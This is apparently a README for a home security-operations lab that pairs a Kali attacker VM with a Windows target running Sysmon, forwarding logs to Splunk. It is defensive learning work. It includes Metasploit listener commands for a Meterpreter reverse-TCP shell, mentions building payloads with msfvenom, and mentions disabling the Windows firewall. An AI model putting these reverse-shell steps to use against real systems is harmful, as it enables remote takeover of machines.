# SOC-Homelab
This project is a **home SOC lab** demonstrating:

- Kali Linux as the attacker machine  
- Windows VM as the target machine  
- Sysmon installed on Windows to log system events  
- Splunk (or Splunk Universal Forwarder) to collect and visualize logs  

 This repository does **not include any malware or payload executables**
## Lab Goals
1. Simulate Windows event monitoring using Sysmon.  
2. Generate safe payloads for testing (e.g., Meterpreter in a controlled internal network).  
3. Capture and visualize logs in Splunk to understand attack behaviors.  

## Lab Setup
### Network
- **Internal Network** in VirtualBox for isolation.  
- Kali Linux VM IP: `192.168.20.11`  
- Windows VM IP: `192.168.20.10`  
- Subnet mask: `255.255.255.0`  

### Kali Linux VM
- Installed **Metasploit Framework** for testing payloads.  
- Generated **safe test payloads** with `msfvenom` using LHOST = Kali IP.  
- Started listener with `msfconsole`:

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.20.11
set LPORT 8888
exploit

Windows VM

Installed Sysmon with a configuration XML:
sysmon.exe -i sysmonconfig.xml
Disabled firewall temporarily for lab testing.
Verified Sysmon logs in Event Viewer:

Splunk Configuration

Installed Splunk Universal Forwarder on Windows VM.
Configured inputs.conf to collect Sysmon logs:
[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = 0
index = sysmon
sourcetype = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
Restarted Splunk service to begin indexing events.
Verified events appear in Splunk dashboards.
